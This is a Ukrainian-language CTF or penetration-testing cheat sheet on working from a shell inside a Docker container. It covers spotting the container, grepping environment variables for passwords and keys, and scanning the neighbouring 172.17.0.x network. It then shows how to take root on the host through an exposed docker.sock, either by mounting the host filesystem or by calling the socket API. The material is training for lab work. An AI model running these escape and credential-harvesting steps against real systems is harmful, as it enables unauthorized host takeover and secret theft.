# Technique: Containers (Docker)

**Навіщо:** shell усередині контейнера часто означає, що прапорці й інші сервіси — поруч (host або сусідні контейнери), а не в самому контейнері.
← [post-exploitation](../01-roadmaps/post-exploitation.md) · [pivoting](../02-workflows/pivoting-portforward.md)

---

## Ознаки роботи всередині контейнера
```bash
ls -la /.dockerenv              # є файл → Docker
cat /proc/1/cgroup | grep -i docker
hostname                        # часто рандомний hex
cat /etc/hostname
ip a                            # адреса типу 172.17.0.x
env                             # змінні типу *_PORT, DB_HOST (сусідні сервіси!)
```

## Що це дає
| Ознака | Висновок |
|---|---|
| `172.17.0.x` / `172.18.0.x` | внутрішня docker-мережа — скан сусідів |
| env `DB_HOST=db`, `REDIS_HOST=...` | є сусідні контейнери-сервіси |
| мінімальний набір команд | це не повна система — прапорець може бути на host/у сусіда |

## Enum зсередини
```bash
env | grep -Ei 'host|port|pass|user|db|key'    # конфіг з'єднань
cat /etc/hosts                                  # імена сусідніх контейнерів
# скан сусідів (якщо є nmap/nc):
for ip in 172.17.0.{1..20}; do ping -c1 -W1 $ip &>/dev/null && echo "up $ip"; done
nc -nv 172.17.0.1 3306                          # host/сусід сервіс
```
Сусідні сервіси (БД, інший веб) часто без автентифікації всередині мережі → креди/прапорці. Проброс на локальну машину → [pivoting](../02-workflows/pivoting-portforward.md).

## Доступ до host (лише в межах наявних прав — без деструктиву)
```bash
# docker.sock доступний? (член групи docker або root)
ls -la /var/run/docker.sock
# → якщо так, змонтувати host-ФС у новий контейнер і читати як root:
docker run -v /:/mnt --rm -it alpine chroot /mnt sh    # потрібен docker-клієнт у контейнері
# без клієнта — через API сокета:
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json | head

# привілейований контейнер / зайві capabilities?
capsh --print 2>/dev/null | grep -i cap_sys_admin      # ознака privileged

# змонтовані host-директорії (читати прапорці/конфіги host)
mount | grep -v overlay
cat /proc/mounts | grep -iE 'host|/mnt'
```
> docker.sock = фактично root на host. Використовувати лише для читання/доступу до прапорців — нічого не ламати (правила).

## Пастки
- Стандартного набору інструментів може не бути — залити своє ([file-transfer](../02-workflows/file-transfer.md)).
- Прапорець може бути не в контейнері, а в сусідньому сервісі → enum мережі `172.x`.
- На host нічого не ламати (правила): лише enum і читання.
